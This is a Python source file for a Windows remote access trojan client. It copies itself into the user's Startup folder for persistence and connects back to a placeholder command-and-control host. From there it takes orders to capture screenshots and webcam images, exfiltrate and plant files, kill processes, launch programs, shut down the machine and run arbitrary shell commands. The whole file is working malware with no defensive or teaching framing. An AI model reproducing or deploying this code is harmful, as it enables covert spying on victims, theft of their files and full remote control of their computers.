import socket
import time
import subprocess
import os
import cv2
import mss
import shutil
import sys

cwd = os.getcwd()
savepath = os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Microsoft")

try:
    startup_folder = os.path.join(os.environ['USERPROFILE'],r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    exe_path = sys.argv[0]
    exe_name = os.path.basename(exe_path)
    destination = os.path.join(startup_folder, exe_name)

    if not os.path.exists(destination):
        shutil.copyfile(exe_path, destination)
except:
    pass

def connection(): 
    global client
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(("IP_ADRESS", IP_PORT))
            client.send("CLIENT_NAME".encode())
            break
        except:
            time.sleep(5)


connection()

while True:
    
    try:
        message = client.recv(1024).decode()

        if message[:2].lower() == "cd" :
            if os.path.exists(message[3:].strip()):
                cwd=message[3:].strip()
                client.send(f"  [>] new dir : {cwd}$$END$$".encode())
            else:
                client.send("  [>] The directory name is invalid$$END$$".encode())

        elif message[:6].lower() == "screen":
            try:
                num = int(message[7:])
                screen_path = os.path.join(savepath, "capturescreen.png")
                with mss.mss() as sct:
                    mss.tools.to_png(sct.grab(sct.monitors[num]).rgb, sct.grab(sct.monitors[num]).size, output=screen_path)
                    
                with open(screen_path, "rb") as f:
                    while True:
                        chunk = f.read(8192)
                        if not chunk:
                            break
                        client.sendall(chunk)
                client.send(b"$$END$$")
                os.remove(screen_path)
            except: 
                client.send(b"$$STOP$$")

        elif message[:3].lower() == "cam":
            try:
                cap = cv2.VideoCapture(int(message[4:]))
                if not cap.isOpened():
                    client.send(b"$$STOP$$")
                    continue
                # for _ in range(10): 
                #     cap.read()
                ret, frame = cap.read()
                cap.release()
                if not ret:
                    client.send(b"$$STOP$$")
                    continue

                cam_path = os.path.join(savepath, "capturecam.png")

                cv2.imwrite(cam_path, frame)
                with open(cam_path, "rb") as f:
                    while True:
                        chunk = f.read(8192)
                        if not chunk:
                            break
                        client.sendall(chunk)
                client.send(b"$$END$$")
                os.remove(cam_path)
            except: client.send(b"$$STOP$$")



        elif message[:8].lower() == "download":
            filename = message[9:].strip()
            file_path = os.path.join(cwd, filename) 

            if os.path.isfile(file_path):
                with open(file_path, "rb") as f:
                    while True:
                        chunk = f.read(8192)
                        if not chunk:
                            break
                        client.sendall(chunk)
                client.send(b"$$END$$")
            else:
                client.send(b"$$STOP$$")



        elif message[:6].lower() == "upload":
            filename = os.path.basename(message[7:].strip())
            file_path = os.path.join(cwd, filename)

            buffer = b""
            client.settimeout(2)

            while True:
                try:
                    data = client.recv(8192)
                    if b"$$END$$" in data:
                        buffer += data.replace(b"$$END$$", b"")
                        break
                    buffer += data
                except socket.timeout:
                    break

            client.settimeout(None)

            with open(file_path, "wb") as f:
                f.write(buffer)

        elif message[:4].lower() == "kill":
            if message[5:].isdigit():
                response = subprocess.run("taskkill /F /PID " + message[5:], shell=True, capture_output=True, text=True)
            elif type(message[5:]) == str:
                response = subprocess.run("taskkill /F /IM " + message[5:], shell=True, capture_output=True, text=True)
            if response.returncode == 0 :
                output = response.stdout + "\n$$END$$"
                client.sendall(output.encode())
            else:
                client.send("  [>] This process does not exist".encode())

        elif message[:5].lower() == "start":
            filename = message[6:].strip()
            file_path = os.path.join(cwd, filename) 
            if os.path.isfile(file_path):
                try:
                    subprocess.Popen(file_path, shell=True, cwd=cwd)
                    client.send("  [>] File has been executed.$$END$$".encode())
                except Exception as e:
                    client.send(f"  [>] Failed to execute: {str(e)}$$END$$".encode())
            else:
                client.send("  [>] This file does not exist.$$END$$".encode())


        elif message[:8].lower() == "shutdown":
            client.send("  [>] Shutting down...$$END$$".encode())
            subprocess.run("shutdown /s /f /t 0", shell=True, capture_output=True, text=True)

        elif message[:7].lower() == "restart":
            client.send("  [>] Restarting...$$END$$".encode())
            subprocess.run("shutdown /r /f /t 0", shell=True, capture_output=True, text=True)

        else:
            try:
                response = subprocess.run(
                    message,
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding='utf-8',
                    errors='ignore',
                    cwd=cwd
                )

                if response.returncode == 0:
                    output = response.stdout
                else:
                    output = response.stderr or "  [>] Unknown error occurred."

                output += "\n$$END$$"
                client.sendall(output.encode())

            except Exception as e:
                error_message = f"  [>] This command does not exist or returned an error.\nDetails: {str(e)}\n$$END$$"
                client.sendall(error_message.encode())

    except:
        connection()